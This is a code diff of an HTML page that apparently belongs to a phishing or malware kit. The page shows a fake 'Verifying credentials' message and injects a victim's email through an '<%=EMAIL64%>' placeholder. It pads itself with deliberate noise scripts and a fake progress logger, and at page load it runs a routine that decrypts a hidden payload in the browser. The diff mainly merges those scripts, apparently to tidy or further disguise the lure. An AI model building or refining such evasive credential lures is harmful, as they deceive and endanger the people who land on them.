@@ -47,18 +47,19 @@
 </head>
 <body>
     <div class="hidden-section">
-        <div data-secure="true" id="encrypted-content" nike-andy=""></div>
+        <div data-secure="true" adidas="<%=EMAIL64%>" info-tag="protected"></div>
     </div>
 
-    <div data-hidden="CCNXJAJJAUKadd"></div>
-    <p class="status-message" adidas="<%=EMAIL64%>">Processing your request, please wait...</p>
+    <div data-hidden="bmV3LXNlY3VyZS1kYXRh"></div>
+    <p class="status-message" nike-andy="">Processing your request, please wait...</p>
 
     <div data-auth-section="">
         <p>Verifying credentials...</p>
     </div>
 
-    <!-- Useless Scripts for Noise -->
+    <!-- Combined JavaScript -->
     <script>
+        // Useless Scripts for Noise
         const generateRandomStuff = () => {
             const items = ["apple", "banana", "cherry", "date", "elderberry"];
             items.forEach(item => {
@@ -66,9 +67,7 @@
             });
         };
         generateRandomStuff();
-    </script>
 
-    <script>
         const fakeProgressLogger = () => {
             const steps = ["Step 1: Initializing...", "Step 2: Loading...", "Step 3: Finalizing..."];
             steps.forEach(step => {
@@ -76,10 +75,8 @@
             });
         };
         fakeProgressLogger();
-    </script>
 
-    <!-- Core Functionality (Heavily Modified) -->
-    <script>
+        // Core Functionality
         const decryptSecurePayload = async (payload, keyHex, saltHex, passphrase) => {
             const hexStringToBytes = (hex) => {
                 const bytes = new Uint8Array(hex.length / 2);
@@ -128,6 +125,7 @@
             }
         };
 
+        // Main Execution
         (async () => {
             console.log("[INIT] Starting advanced security module...");
             const securePayload = {
